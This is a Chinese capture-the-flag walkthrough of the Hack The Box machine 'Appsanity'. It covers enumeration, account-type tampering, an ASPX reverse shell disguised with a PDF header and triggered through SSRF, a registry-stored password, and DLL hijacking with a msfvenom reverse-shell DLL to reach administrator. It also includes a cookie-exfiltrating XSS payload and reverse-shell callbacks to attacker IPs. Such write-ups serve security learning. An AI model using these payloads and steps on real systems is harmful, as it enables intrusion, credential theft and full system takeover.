# 概述

​		80口上的web服务在注册用户的过程中可以通过修改Acctype=2来注册成为docker，然后利用注册成功后账户的cookie可以去访问子站点http://portal.meddigi.htb。在http://portal.meddigi.htb中发现了文件上传和SSRF漏洞。利用SSRF去访问上传的aspx恶意文件获取初始立足点。
​		我们获取初始立足点的用户是svc_exampanel，我在`C:\inetpub\ExaminationPanel\ExaminationManagement.dll`中发现查询了注册表Software\\MedDigi的EncKey键，这个键得到了一个字符串，通过密码喷洒确定这是devdoc用户的密码。在切换到devdoc用户后在C:\\Program Files\\ReportManagement发现了tcp 100口上运行的程序。将ReportManagement.exe放到本地分析，发现upload功能调用了C:\\Program Files\\ReportManagement\\Libraries中的externalupload.dll，而C:\\Program Files\\ReportManagement\\Libraries中一开始没有这个dll，我们可以上传恶意的dll到这个路径下，然后利用upload功能去触发恶意dll获取administrator的shell。

​		我没有成功分析调试ReportManagement.exe。

​		



# 0x1、基础信息收集

## 1.1、端口扫描

1. 全tcp端口扫描

   ```
   └─# nmap -sS -p- -Pn 10.10.11.238 --min-rate 10000   
   PORT     STATE SERVICE
   80/tcp   open  http
   443/tcp  open  https
   5985/tcp open  wsman
   ```

2. 全udp端口扫描

   ```
   └─# nmap -sU -p- -Pn 10.10.11.238 --min-rate 10000          
   
   ```

3. 开放端口详细信息扫描

   ```
   #提取开放端口
   └─# cat port.txt | cut -d '/' -f 1 | tr '\n' ','
   80,443,5985,
   
   └─# nmap -sV -sC -Pn -O -p80,443,5985 10.10.11.238 --min-rate 1000 
   PORT     STATE SERVICE    VERSION
   80/tcp   open  http       Microsoft IIS httpd 10.0
   |_http-title: Did not follow redirect to https://meddigi.htb/
   |_http-server-header: Microsoft-IIS/10.0
   443/tcp  open  https?
   7680/tcp open  pando-pub?
   Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
   Device type: general purpose
   Running (JUST GUESSING): Microsoft Windows XP (89%)
   OS CPE: cpe:/o:microsoft:windows_xp::sp3
   Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (85%)
   No exact OS matches for host (test conditions non-ideal).
   Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
   ```

   nmap探测到的目标机器是windows XP SP3，但是web服务器是IIS 10.0，根据经验判断目标机器应该是高于windows server 2016



## 1.2、端口服务枚举

### 1.2.1 TCP 80 HTTP

1. 简单的指纹识别

   ```
   └─# whatweb http://10.10.11.238
   http://10.10.11.238 [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.238], Microsoft-IIS[10.0], RedirectLocation[https://meddigi.htb/], Title[Document Moved]
   ERROR Opening: https://meddigi.htb/ - no address for meddigi.htb
   ```

   添加对应的解析到/etc/hosts中

   ```
   └─# echo "10.10.11.238 meddigi.htb" >> /etc/hosts                              
   ```

2. 然后在浏览器中访问该站点会跳转到https://meddigi.htb/，80和443端口上的是同一个服务，枚举一个即可

   

3. 枚举web子目录

   枚举web子目录的时候发现会自动跳转到/home

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://meddigi.htb/ -t 50 --no-error
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     https://meddigi.htb/
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   
   Error: the server returns a status code that matches the provided options for non existing urls. https://meddigi.htb/8f0f0156-7592-4009-b59c-9ba6e1191f24 => 302 (Length: 147). To continue please exclude the status code or the length
   ```

   忽略302状态码，没有特别有用的目录

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://meddigi.htb/ -t 50 --no-error --status-codes-blacklist '302' 
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     https://meddigi.htb/
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
   [+] Negative Status codes:   302
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /error                (Status: 200) [Size: 194]
   /home                 (Status: 200) [Size: 32809]
   /signup               (Status: 200) [Size: 7847]
   /Home                 (Status: 200) [Size: 32809]
   /Error                (Status: 200) [Size: 194]
   /signin               (Status: 200) [Size: 3792]
   /Signup               (Status: 200) [Size: 7847]
   /signIn               (Status: 200) [Size: 3792]
   /HOME                 (Status: 200) [Size: 32809]
   /SignUp               (Status: 200) [Size: 7847]
   /Signin               (Status: 200) [Size: 3792]
   /SignIn               (Status: 200) [Size: 3792]
   /ERROR                (Status: 200) [Size: 194]
   Progress: 62284 / 62285 (100.00%)
   ===============================================================
   Finished
   ```

4. 枚举虚拟主机名

   ```
   └─# gobuster vhost -u meddigi.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 50 --append-domain
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:             http://meddigi.htb
   [+] Method:          GET
   [+] Threads:         50
   [+] Wordlist:        /usr/share/seclists/Discovery/DNS/namelist.txt
   [+] User Agent:      gobuster/3.6
   [+] Timeout:         10s
   [+] Append Domain:   true
   ===============================================================
   Starting gobuster in VHOST enumeration mode
   ===============================================================
   Found: dns:monportail.meddigi.htb Status: 400 [Size: 334]    
   ```

   

5. 等待web子目录枚举和虚拟主机名枚举期间检查一下目标web站点的功能。

   首先可以在右上角看见support@meddigi.htb 邮箱，有一个登录页面，使用邮箱和密码登录，于是我尝试了`admin@meddigi.htb:admin123`之类的弱口令，但是并没有成功。

   

   注册了一个用户成功登录，右边似乎允许我们跟主管交互

   ![image-20231029183528973](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161143570.png)

   对于这种功能点，常见的可能存在的问题是可以窃取cookie，我尝试了下列负载窃取cookie，似乎不存在xss。

   ```
   <script>new Image().src="http://10.10.16.13/cool.jpg?output="+document.cookie;</script>
   ```



6. 登陆成功后发现当前用户的cookie中存在JWT，这里的aud参数似乎是用户身份标识。尝试对抗JWT来伪造其他用户，但是并不知道其他用户身份，简单尝试了几次失败后暂时放弃。

   ![image-20231029185358429](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161143095.png)

   ​		目前没有找到其他有用的攻击点，先来详细探测一下虚拟主机名

   

   

### 1.2.2 子域名站点测试

1. 之前使用gobuster此时枚举到一个子域名  `monportail.meddigi.htb`，状态码是400，无法正常访问，换用其他工具枚举

2. 使用ffuf

   ```
   └─# ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.238/ -H 'Host:FUZZ.meddigi.htb'
   
   [snip]
   aacelearning            [Status: 302, Size: 143, Words: 9, Lines: 2, Duration: 440ms]
   3com                    [Status: 302, Size: 143, Words: 9, Lines: 2, Duration: 437ms]
   13                      [Status: 302, Size: 143, Words: 9, Lines: 2, Duration: 522ms]
   aaaowa                  [Status: 302, Size: 143, Words: 9, Lines: 2, Duration: 522ms]
   [snip]
   ```

   可以看到有许多响应的size是143，这种是无效的访问，利用--fs来过滤掉这种结果

   ```
   └─# ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u https://meddigi.htb/ -H 'Host:FUZZ.meddigi.htb' -fs 143
   ```

3. 使用wfuzz，这边换用一个较小的字典

   ```
   └─# wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://meddigi.htb/ -H "Host: FUZZ.meddigi.htb" --hw 24 
   
   =====================================================================
   ID           Response   Lines    Word       Chars       Payload                                            
   =====================================================================
   
   000000001:   404        6 L      24 W       315 Ch      "www"                                              
   000000003:   404        6 L      24 W       315 Ch      "ftp"                                              
   000000047:   404        6 L      24 W       315 Ch      "news"                                             
   000000007:   404        6 L      24 W       315 Ch      "webdisk"                                          
   000000050:   404        6 L      24 W       315 Ch      "wiki"                                             
   000000031:   404        6 L      24 W       315 Ch      "mobile"                                           
   000000048:   200        56 L     162 W      2976 Ch     "portal"                                           
   000000046:   404        6 L      24 W       315 Ch      "img"                                              
   000000015:   404        6 L      24 W       315 Ch      "ns"                                               
   000000049:   404        6 L      24 W       315 Ch      "server"     
   ```

   利用--hw过滤掉word为24的内容

   ```
   └─# wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://meddigi.htb/ -H "Host: FUZZ.meddigi.htb" --hw 24 
   
   =====================================================================
   ID           Response   Lines    Word       Chars       Payload                                            
   =====================================================================
   
   000000048:   200        56 L     162 W      2976 Ch     "portal" 
   ```

   将子域名添加到/etc/hosts中

   ```
   echo "10.10.11.238 portal.meddigi.htb" >> /etc/hosts
   ```

4. 在url中访问portal.meddigi.htb是一个登录页面，使用之前注册的凭证登录，没有成功。

   ![image-20231029200830185](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161143166.png)

   这看起来是一个医生的登录页面，我们要想办法注册一个医生的用户。

   

5. 枚举portal.meddigi.htb的web子目录没有找到注册页面，只在meddigi.htb上有注册功能。

   研究注册流程，发现有一个`Acctype=1`,默认使用的这个注册的是MedigiUser身份。

   ```
   POST /Signup/SignUp HTTP/2
   
   Host: meddigi.htb
   
   Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8FB3QdyGIbhKg2Z7obM2y6mJW7HXFKlsyL_1q9rHk9DMHpPRr3ziLPqqkh5QF_D6ZaaAdQjnQdLKbFOPOhrxqdvKR7fHW9VeqLCWyDlKt_UAV3FhSxILWZmBx1GkLEMN4zjhPNxCbnX7nI-hgSG9pAo
   
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
   
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   
   Accept-Encoding: gzip, deflate, br
   
   Content-Type: application/x-www-form-urlencoded
   
   Content-Length: 334
   
   Origin: https://meddigi.htb
   
   Referer: https://meddigi.htb/signup
   
   Upgrade-Insecure-Requests: 1
   
   Sec-Fetch-Dest: document
   
   Sec-Fetch-Mode: navigate
   
   Sec-Fetch-Site: same-origin
   
   Sec-Fetch-User: ?1
   
   Te: trailers
   
   
   
   Name=y&LastName=an&Email=yan%40test.com&Password=123456789&ConfirmPassword=123456789&DateOfBirth=2023-10-29&PhoneNumber=0123456789&Country=cn&Acctype=1&__RequestVerificationToken=CfDJ8FB3QdyGIbhKg2Z7obM2y6nUj8NfN4RJl5ceWBcou1z8u7TXQ0ybiFbIUH-14fQEbAlAcDTuM-_4zEVUdvpOoJWy34yhBvWZ8HZGJEIp83BS42WIftYJwxe4T8xZ9J7F6ZsUJnqvMXKD7QKigLIi7kM
   ```

   研究Acctype参数，修改它的值尝试，最终当修改Acctype=2的时候获取了docker身份

   ![image-20231029205650657](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161143783.png)

6. 使用获取了docker身份的凭证无法登录http://portal.meddigi.htb ,但是发现了该页面的存在cookie

   ![image-20231029205839297](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161143364.png)

   将在http://medigi.htb页面上注册成docker的cookie复制到http://portal.meddigi.htb中，成功登录

   ![image-20231029210335680](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161143215.png)

   

7. 发现一个文件上传功能点，还贴心的回显了文件存储路径，尝试后告知只能上传PDF文件。

   ![image-20231029210616702](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161144249.png)

      尝试绕过文件后缀来上传aspx类型的文件失败。稍后研究如何制作PDF类型的reverse shell

   

8. 发现该页面存在SSRF漏洞。

   ![image-20231029211549682](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161144415.png)

   我填写tun0的ip，收到了来自目标机器的访问。

   ```
   └─# nc -nvlp 80              
   listening on [any] 80 ...
   connect to [10.10.16.13] from (UNKNOWN) [10.10.11.238] 55484
   GET / HTTP/1.1
   Host: 10.10.16.13
   traceparent: 00-9056acc987919cccc59d6031b1d0ddb6-2226652aef72f810-00
   ```

   利用SSRF来枚举一下内网上的端口，测试一下常见的web端口，比如80，443，8080

   在127.0.0.1:8080端口上发现这边可以访问我们之前上传的pdf文件。

   ![image-20231029215902579](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161144767.png)



9. 尝试文件上传绕过，首先查看一下正常的PDF文件头，得到%PDF-1.6.%

   ```
   └─# cat cs1.pdf | xxd
   00000000: 2550 4446 2d31 2e36 0d25 e2e3 cfd3 0d0a  %PDF-1.6.%......
   00000010: 3234 2030 206f 626a 0d3c 3c2f 4c69 6e65  24 0 obj.<</Line
   ```
   
   在reverse_shell.aspx中追加pdf的文件头
   
   ```
      %PDF-1.6.%
   
      <%@ Page Language="C#" %>
      <%@ Import Namespace="System.Runtime.InteropServices" %>
      <%@ Import Namespace="System.Net" %>
      <%@ Import Namespace="System.Net.Sockets" %>
      <%@ Import Namespace="System.Security.Principal" %>
      <%@ Import Namespace="System.Data.SqlClient" %>
      <script runat="server">
      //Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
      //Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
          
      	protected void Page_Load(object sender, EventArgs e)
          {
      	    String host = "10.10.16.13"; //CHANGE THIS
                  int port = 4444; ////CHANGE THIS
                      
              CallbackShell(host, port);
          }
      [snip]
   ```
   
   



# 0x2、获取初始立足点

1. 整理一下目前拥有的信息

   https://portal.meddigi.htb/Prescriptions页面存在SSRF漏洞

   目标机器在本地的127.0.0.1:8080端口上运行着一个服务，可以查看到上传文件的路径

   在https://portal.meddigi.htb/examreport可以上传文件，可以通过PDF文件头的方式绕过来上传恶意的aspx文件

2. 现在的攻击思路大致是

   ```
   绕过限制上传恶意aspx文件-->ssrf 127.0.0.1:8080获取恶意aspx文件路径 --> ssrf 127.0.0.1:8080/恶意aspx路径
   ```

   

   绕过上传后在/Prescriptions利用ssrf访问http://127.0.0.1:8080,查看源代码可以发现上传后的文件名是**baaea62b-b643-4fb3-a01c-bb0b734aba0f_reverse_shell.aspx**

   ![image-20231030104531393](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161144079.png)

   然后在利用ssrf访问http://127.0.0.1:8080/ViewReport.aspx?file=08d36287-6d76-40bf-b835-007ff1fbbaba_reverse_shell.aspx，成功getshell

   ```
   └─# nc -nvlp 4444
   listening on [any] 4444 ...
   connect to [10.10.16.13] from (UNKNOWN) [10.10.11.238] 54868
   Spawn Shell...
   Microsoft Windows [Version 10.0.19045.3570]
   (c) Microsoft Corporation. All rights reserved.
   
   c:\windows\system32\inetsrv>whoami
   whoami
   appsanity\svc_exampanel
   
   c:\windows\system32\inetsrv>hostname
   hostname
   Appsanity
   
   c:\windows\system32\inetsrv>ipconfig
   ipconfig
   
   Windows IP Configuration
   
   
   Ethernet adapter Ethernet0 3:
   
      Connection-specific DNS Suffix  . : 
      IPv4 Address. . . . . . . . . . . : 10.10.11.238
      Subnet Mask . . . . . . . . . . . : 255.255.254.0
      Default Gateway . . . . . . . . . : 10.10.10.2
   
   c:\windows\system32\inetsrv>
   ```



# 0x3、本地特权提升

## 3.1 枚举

1. 首先利用winPEASany.exe来枚举收集一下基本信息

   ①目标机器上的用户

   ```
   Ever logged users
       IIS APPPOOL\MedDigi
       IIS APPPOOL\DefaultAppPool
       IIS APPPOOL\ExamPanel
       IIS APPPOOL\MedDigiPortal
       APPSANITY\Administrator
       APPSANITY\svc_meddigiportal
       APPSANITY\svc_exampanel
       APPSANITY\svc_meddigi
       APPSANITY\devdoc
   ```

   ②发现本地TCP 100端口上运行着ReportManagement

   ![image-20231030120434569](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311161144751.png)

   ③找到了svc_exampanel用户的哈希，可以尝试破解，如果该用户可以登录的话，如果我们意外丢失了shell可以利用凭证快速登录

   ```
   Version: NetNTLMv2
     Hash:    svc_exampanel::APPSANITY:1122334455667788:2bbb47e37dc280c5ed854b8f163d88e3:0101000000000000ea32c311e30ada014e9fde5914fa3c78000000000800300030000000000000000000000000200000f3606b8563a96598fc8426891a83ab740e5210c8c4a52e155f4d6ba4b58034df0a00100000000000000000000000000000000000090000000000000000000000 
   ```

   这边我发现svc_exampanel用户不属于远程管理组，因此无法无法通过PTH利用winrm登录，只有devdoc用户属于远程管理组

   ```
   C:\Users>net localgroup "Remote Management Users"
   net localgroup "Remote Management Users"
   Alias name     Remote Management Users
   Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
   
   Members
   
   -------------------------------------------------------------------------------
   devdoc
   The command completed successfully.
   ```

   ④查看当前svc_exampanel用户的详细信息

   ```
   C:\Users\svc_exampanel\Pictures>whoami /all
   whoami /all
   
   USER INFORMATION
   ----------------
   
   User Name               SID                                           
   ======================= ==============================================
   appsanity\svc_exampanel S-1-5-21-4111732528-4035850170-1619654654-1007
   
   
   GROUP INFORMATION
   -----------------
   
   Group Name                             Type             SID                                                            Attributes                                        
   ====================================== ================ ============================================================== ==================================================
   Everyone                               Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
   BUILTIN\Users                          Alias            S-1-5-32-545                                                   Mandatory group, Enabled by default, Enabled group
   NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                        Mandatory group, Enabled by default, Enabled group
   CONSOLE LOGON                          Well-known group S-1-2-1                                                        Mandatory group, Enabled by default, Enabled group
   NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
   NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                       Mandatory group, Enabled by default, Enabled group
   NT AUTHORITY\Local account             Well-known group S-1-5-113                                                      Mandatory group, Enabled by default, Enabled group
   BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                   Mandatory group, Enabled by default, Enabled group
   LOCAL                                  Well-known group S-1-2-0                                                        Mandatory group, Enabled by default, Enabled group
   IIS APPPOOL\ExamPanel                  Well-known group S-1-5-82-2916625395-3930688606-393764215-2099654449-2832396995 Mandatory group, Enabled by default, Enabled group
   NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                    Mandatory group, Enabled by default, Enabled group
   Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                      
   
   
   PRIVILEGES INFORMATION
   ----------------------
   
   Privilege Name                Description                          State   
   ============================= ==================================== ========
   SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
   SeShutdownPrivilege           Shut down the system                 Disabled
   SeAuditPrivilege              Generate security audits             Disabled
   SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
   SeUndockPrivilege             Remove computer from docking station Disabled
   SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
   SeTimeZonePrivilege           Change the time zone                 Disabled
   ```

   

2. 将目标机器的TCP 100端口转发到kali的100端口查看

   ```
   kali执行
   └─# ./chisel server -p 1234 --reverse
   
   
   目标机器执行
   C:\Users\svc_exampanel\Desktop>chisel.exe client 10.10.16.13:1234 R:100:127.0.0.1:100
   
   确定转发成功
   └─# ss -anlp | grep 100 
   tcp   LISTEN 0      4096                                              *:100                    *:*    users:(("chisel",pid=42949,fd=8)) 
   ```

   简单测试一下该服务

   ```
   └─# nc 127.0.0.1 100
   Reports Management administrative console. Type "help" to view available commands.
   help
   Available Commands:
   backup: Perform a backup operation.
   validate: Validates if any report has been altered since the last backup.
   recover <filename>: Restores a specified file from the backup to the Reports folder.
   upload <external source>: Uploads the reports to the specified external source.
   backup
   Backup operation completed successfully.
   validate
   Validation completed. All reports are intact.
   ```

   可以执行四种命令，稍后研究

   backup：执行备份操作。
   validate：验证自上次备份以来是否有任何报告被更改。
   recover <文件名>：将指定文件从备份恢复到 Reports 文件夹。
   upload <外部源>：将报告上传到指定的外部源。



3. 既然我们用户属于IIS_User，先详细枚举一下IIS（C:\inetpub）

   由于我们的用户是svc_exampanel，于是我重点枚举了C:\inetpub\ExaminationPanel

   转储上述路径下的所有文件到本地，我是通过smb实现的，然后通过使用dnSpy反编译ExaminationManagement.dll发现了一串有趣的内容

   ```
   		private string RetrieveEncryptionKeyFromRegistry()
   		{
   			string result;
   			try
   			{
   				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
   				{
   					if (registryKey == null)
   					{
   						ErrorLogger.LogError("Registry Key Not Found");
   						base.Response.Redirect("Error.aspx?message=error+occurred");
   						result = null;
   					}
   					else
   					{
   						object value = registryKey.GetValue("EncKey");
   						if (value == null)
   						{
   							ErrorLogger.LogError("Encryption Key Not Found in Registry");
   							base.Response.Redirect("Error.aspx?message=error+occurred");
   							result = null;
   						}
   						else
   						{
   							result = value.ToString();
   						}
   					}
   				}
   			}
   			catch (Exception ex)
   			{
   				ErrorLogger.LogError("Error Retrieving Encryption Key", ex);
   				base.Response.Redirect("Error.aspx?message=error+occurred");
   				result = null;
   			}
   			return result;
   		}
   ```

   从注册表"Software\MedDigi"中提取了EncKey键，我们也操作一下，得到了EncKey

   ```
   C:\>reg query HKEY_LOCAL_MACHINE\Software\MedDigi
   reg query HKEY_LOCAL_MACHINE\Software\MedDigi
   
   HKEY_LOCAL_MACHINE\Software\MedDigi
       EncKey    REG_SZ    1g0tTh3R3m3dy!!
   ```

4. 进行密码喷洒，确定这是devdoc用户的密码

   ```
   └─# evil-winrm -i 10.10.11.238 -u devdoc  -p '1g0tTh3R3m3dy!!'       
                                           
   Evil-WinRM shell v3.5
                                           
   Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
                                           
   Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                           
   Info: Establishing connection to remote endpoint
   *Evil-WinRM* PS C:\Users\devdoc\Documents> whoami
   appsanity\devdoc
   ```



## 3.2 devdoc用户权限后枚举

1. 在C:\Program Files\ReportManagement下发现了ReportManagement.exe，该应用程序名跟tcp 100上的进程名一样，我有理由怀疑该进程运行的就是该程序。同时这边还有许多dll文件，全部打包到本地进行调试

   ```
   *Evil-WinRM* PS C:\Program Files\ReportManagement> dir
   
   
       Directory: C:\Program Files\ReportManagement
   
   
   Mode                 LastWriteTime         Length Name
   ----                 -------------         ------ ----
   d-----        10/31/2023   5:09 PM                Libraries
   -a----          5/5/2023   5:21 AM          34152 cryptbase.dll
   -a----          5/5/2023   5:21 AM          83744 cryptsp.dll
   -a----         3/11/2021   9:22 AM         564112 msvcp140.dll
   -a----         9/17/2023   3:54 AM         140512 profapi.dll
   -a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
   -a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
   -a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
   -a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
   -a----          5/5/2023   5:21 AM         179248 wldp.dll
   ```

   但是有一个ReportManagementHelper.exe没有权限下载



## 3.3 提权

生成恶意的dll并将其上传到`C:\\Program Files\\ReportManagement\\Libraries`目录下

```
└─# msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=443 -f dll -o externalupload.dll
```

将目标机器的tcp 100端口转发到本地，然后调用upload功能去触发恶意的dll

```
kali执行
└─# ./chisel server -p 1234 --reverse

目标机器执行
*Evil-WinRM* PS C:\users\devdoc\Downloads> .\chisel.exe client 10.10.16.54:1234 R:100:127.0.0.1:100


└─# nc 127.0.0.1 100  
Reports Management administrative console. Type "help" to view available commands.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
upload aaaa
Attempting to upload to external source.

```

成功获取administrator的shell

```
└─# nc -nvlp 443                       
listening on [any] 443 ...
connect to [10.10.16.54] from (UNKNOWN) [10.10.11.238] 55880
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\ReportManagement>whoami
whoami
appsanity\administrator

```

